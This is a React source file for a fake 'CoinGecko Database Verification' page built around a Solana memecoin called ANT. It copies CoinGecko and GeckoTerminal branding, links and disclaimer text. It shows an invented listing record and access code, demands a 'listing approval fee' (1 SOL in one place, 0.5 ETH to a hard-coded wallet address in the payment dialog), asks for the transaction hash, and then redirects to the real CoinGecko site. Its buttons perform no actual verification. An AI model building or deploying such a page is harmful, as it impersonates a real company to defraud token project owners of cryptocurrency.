import React from 'react'
import { IoConstructSharp } from "react-icons/io5";
import Backdrop from '@mui/material/Backdrop';
import CircularProgress from '@mui/material/CircularProgress';
import Button from '@mui/material/Button';
import Dialog from '@mui/material/Dialog';
import DialogActions from '@mui/material/DialogActions';
import DialogContent from '@mui/material/DialogContent';
import DialogContentText from '@mui/material/DialogContentText';
import DialogTitle from '@mui/material/DialogTitle';


const Startpage = () => {
  const [open, setOpen] = React.useState(false);
  const [show, setShow] = React.useState(false);
  const [addy, setAddy] = React.useState(false);
  const handleOpen = () => {
    setOpen(true);

    setTimeout(() => {
      setOpen(false);
     
    }, 5000);
    setTimeout(() => {
      setShow(true);
    }, 3100);

  };


  const handleClickOpen = () => {
    setOpen(true);
    setShow(false);
    setTimeout(() => {
      setOpen(false)
    }, 5000);
    setTimeout(() => {
      setAddy(true)
    }, 5100);
  };

  const Close = () => {
    window.location.replace("https://www.coingecko.com/request-form/submissions?locale=en")
  };
  const cancel = () => {
    setAddy(false)
  };

  
const submit = ()=>{
  alert("You are not authorized to make changes to this database.")
  setTimeout(() => {
    window.location.replace("https://www.coingecko.com/")
  }, 1000);
}


  return (
    <div className='bg-[#111827] w-full'>
     <nav className=' text-gray-300'>
  
  <div className=' p-3 pt-4 flex app items-center justify-between'>
  <img src="/img/Asset 7.png" alt="" className='md:w-[15%] w-[50%]'/>
  

  <div className='md:flex hidden justify-between w-[20%] mr-10'>
    <a href="https://apiguide.geckoterminal.com/" >
    <p className='p-2 border'>Public API Docs</p>
    </a>
    <a href="https://forms.gle/auEd1RUveZFXLcpv9" >
    <p className='p-2 border border-gray-300'>Give Feedback</p>
    </a>
  </div>
  </div>
     </nav>

<div className=' nnn px-3 text-gray-300 py-5'>
<section className='md:text-xl text-sm app font-semi-bold'>
<p>DATABASE VERIFICATION</p>
</section>
<p className='app md:text-sm text-xs text-gray-300 p-1'>
  Verify your project Details directly form the CoinGecko Database
</p>
<div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
<img className='md:w-[2%] w-[7%] rounded-full' src="https://dd.dexscreener.com/ds-data/tokens/solana/GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump.png?key=04e836" alt="" />
<p>ANT</p>
</div>

<div className='p-2 app bg-[#000000] mt-2 md:mt-5'>
<p className='text-[#b79761]'>_database_access_code: <span className='text-[#CFADE8]'>1a93b6a9-7b9d-440a-8cfe-0966616399z9</span></p>
</div>
<div className='md:grid md:grid-cols-2 md:gap-2 '>

<div className=' p-2 app overflow-scroll bg-[#000000] mt-2 lll'>
<p className='text-[#C0E48B]'> 
Database_file
</p>
<p className='mt-3 text-[#FD5370]'>project_data:[
  <div className='my-1 pl-2 text-[#b79761]'>
  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1007240079",</span></p>
  <p>"type": <span className='text-[#CFADE8]'>"memecoin",</span></p>
  <p className='mt-1 text-[#FD5370]'>"attributes": <span className='text-[#CFADE8]'>[
    <div className='text-[#b79761] py-1'>
    <p>"name": <span className='text-[#CFADE8]'>"Ant",</span></p>
    <p>"symbol": <span className='text-[#CFADE8]'>"ANT",</span></p>
    <p>"chain": <span className='text-[#CFADE8]'>"solana",</span></p>
    <p>"contract_address": <span className='text-[#CFADE8]'>"GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump",</span></p>
    <p>"decimals": <span className='text-[#CFADE8]'>"6",</span></p>
    <p>"image_url": <span className='text-[#CFADE8]'>"",</span></p>
    <p>"total_supply": <span className='text-[#CFADE8]'>"999,732,887.83",</span></p>
    <p>"liquidity": <span className='text-[#CFADE8]'>"28,000",</span></p>
    <p>"market_cap": <span className='text-[#CFADE8]'>"69,366.76",</span></p>
    <p>"price_usd": <span className='text-[#CFADE8]'>"0.0000693853",</span></p>
    </div>
    ],</span></p>

  </div>
  </p>
</div>

<div className=' p-2 md:pt-2 pt-0 overflow-scroll app bg-[#000000] md:mt-2 lll'>
<p className='text-[#FD5370]'>"description": <span className='text-[#CFADE8]'>[
  <div className='my-1 pl-2 text-[#b79761]'>
  <p>"en": <span className='text-[#CFADE8]'>"We are an NFT and Token project on SOL. We are known as the people’s project and are Education centred. A project based on Ants, working together and for each other via support, learning and guidance.",</span></p>
  <p>"de": <span className='text-[#CFADE8]'>"",</span></p>
  </div>
 ],</span>
  <p className='mt-1 text-[#FD5370]'>"links": <span className='text-[#CFADE8]'>[
    <div className='text-[#b79761] py-1'>
    <p>"website": <span className='text-[#CFADE8]'>"https://antsnest.io/",</span></p>
    <p>"whitepaper": <span className='text-[#CFADE8]'>"",</span></p>
    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://solscan.io/token/GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump",</span></p>
    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/TheAntsPortal",</span></p>
    <p>"twitter_url": <span className='text-[#CFADE8]'>"https://x.com/theantznest?s=21",</span></p>
    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://raydium.io/swap/?inputMint=GpzTUBLEPTFL6S8L8rDY2ABXS9FaXq13cy8UtdYppump&outputMint=sol",</span></p>
   
    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/solana/pools/BsmVzrHB9UnFDJ5RZVufnqAGF58bKFx3wrossur4w1Pb",</span></p>
    <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"listing_approval",</span></p>
    </div>
      ],</span></p> ].</p>
      
  

  <div className='flex justify-center'>
<img className='w-[60%]' src="/img/Asset 4.png" alt="" />
</div>
</div>
</div>

<div className='p-2 text-xs md:text- app bg-[#000000] mt-5'>
<p>
Please ensure that all details are accurately implemented to avoid additional charges for token updates by <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a>. Once verified, approve the publishing. It takes approximately 1-3 hours for the listing to be fully published on our official <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a> platform.
</p>
<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing Approval fee cost 1 Sol, Endavour to send payment tx for fast verification and approval., After approval project will be listed in 10-20 minutes.</p>
</div>

<div className='mt-3 app flex justify-between'>
<button className='px-4 py-2 bg-[#66BB6A]' onClick={submit}>Approve Listing</button>
<button className='px-4 py-2 bg-[#FD5370] flex gap-2 items-center' onClick={submit}><IoConstructSharp className='text-black text-lg'/>Edit details </button>
</div>


</div>

<div className='nnn mt-20 '>
  <footer className='app text-gray-400'>
    <div className='md:flex p-5  '>
<section className='md:w-[60%] app '>
<img src="/img/Asset 7.png" alt="" className='md:w-[30%] w-[70%]'/>
<p className='mt-5 text-xs'>GeckoDatabase is the most fastest and comprehensive real-time DEX tracker, 
  built by the team behind CoinGecko. Helping crypto projects with fast track listings, tokens updates for any project and more on decentralized exchanges across all blockchains.</p>
</section>
<section className='md:w-[20%]'>
  <p className='font-bold md:mb-3 mb-2 md:mt-0 mt-5'>Resources</p>
  <p className='hover:text-gray-100'><a href="https://www.geckoterminal.com/ethwars">ETH Wars</a></p>
</section>
<section className='md:w-[20%]'>
<p className='font-bold md:mb-3 mb-2 md:mt-0 mt-5'>About</p>
<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/about-us">About Us</a></p>
<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/disclaimer">Disclaimer</a></p>
<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/terms-conditions">Terms and Conditions</a></p>
<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/privacy-policy">Privacy Policy</a></p>
<p className='mb-1 hover:text-gray-100'><a href="https://www.geckoterminal.com/ad-policy">Ad Policy</a></p>
</section>
    </div>

    <div className='nnn md:block hidden p-5 text-xs'>
<p><a href="https://www.geckoterminal.com/disclaimer" className='underline text-sm text-white'>IMPORTANT DISCLAIMER:</a> All content provided herein our website, hyperlinked sites, 
  associated applications, forums, blogs, social media accounts and other platforms (“Site”) is for your general information only, 
  procured primarily from third party sources. We make no warranties of any kind in relation to our content and services
   (such as token swap functionalities), including but not limited to accuracy, security and updatedness. No part of the 
   content and services that we provide constitutes financial advice, legal advice or any other form of advice meant for your
    specific reliance for any purpose, nor any dealing in (or promotion of) securities for which a license is required 
    from the Monetary Authority of Singapore. Any use or reliance on our content and services is solely at your own risk and 
    discretion. You should conduct your own research, review, analyze and verify our content and services before relying on or using them. Trading is a highly risky activity that can lead to major losses, 
    please therefore consult your financial advisor before making any decision. 
  No content on our Site is meant to be a solicitation or offer.</p>
    </div>
  </footer>
</div>
<Backdrop
        sx={{ color: '#fff', zIndex: (theme) => theme.zIndex.drawer + 1 }}
        open={open}
      
      >
        <CircularProgress color="inherit" />
      </Backdrop>
      <div>
      <React.Fragment>
      <Dialog
        open={show}
        aria-labelledby="alert-dialog-title"
        aria-describedby="alert-dialog-description"
      >
        <DialogTitle id="alert-dialog-title">
          <p className='md:text-base font-bold text-sm'>
          PAYMENT DETAILS
          </p>
        </DialogTitle>
        <DialogContent>
          <DialogContentText id="alert-dialog-description">
            <p className='app md:text-sm text-xs'>
            Send excatly 0.5 Eth to the wallet address by copying it, to avoid delay or loss of funds.
           
            </p>
            <p className='text-sm mt-2 text-black font-bold app'>
              Eth Address:
            </p>
            <p className='app text-black'>
            0x4E8ACC4c74e5FF78d1ff32AC345DfC3dfdE5A887
            </p>
          </DialogContentText>
        </DialogContent>
        <DialogActions>
         
          <button onClick={handleClickOpen} autoFocus className='w-full app bg-green-600 py-2'>
            I have made payment
          </button>
        </DialogActions>
        </Dialog>
        </React.Fragment>
      </div>
      <div>
      <React.Fragment>
      <Dialog
        open={addy}
        aria-labelledby="alert-dialog-title"
        aria-describedby="alert-dialog-description"
      >
        <DialogTitle id="alert-dialog-title">
          <p className='md:text-base font-bold text-sm'>
          PAYMENT TRANSACTION DETTAILS
          </p>
        </DialogTitle>
        <DialogContent>
          <DialogContentText id="alert-dialog-description">
   <p className='app text-sm'>
    Please provide us with the payment transaction tx, for fast track and proper verification of payment. 
   </p>
   <input type="text" required className='mt-2 p-2 app w-full outline-none border-black border-2'/>
          </DialogContentText>
        </DialogContent>
        <DialogActions>
         
          <button onClick={Close} autoFocus className='w-full app bg-green-600 py-2'>
            Submit
          </button>
          <button onClick={cancel} autoFocus className='w-full app bg-red-600 py-2'>
            Cancel
          </button>
        </DialogActions>
        </Dialog>
        </React.Fragment>
      </div>
    </div>
  )
}

export default Startpage
